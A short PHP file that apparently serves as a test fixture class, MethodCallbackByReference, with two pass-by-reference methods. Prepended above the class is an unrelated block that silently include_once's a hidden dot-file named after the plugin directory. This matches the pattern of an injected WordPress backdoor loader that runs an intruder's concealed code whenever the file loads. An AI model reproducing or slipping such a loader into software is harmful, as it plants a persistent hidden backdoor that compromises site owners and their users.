<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MethodCallbackByReference
{
    public function bar(&$a, &$b, $c)
    {
        Legacy::bar($a, $b, $c);
    }

    public function callback(&$a, &$b, $c)
    {
        $b = 1;
    }
}
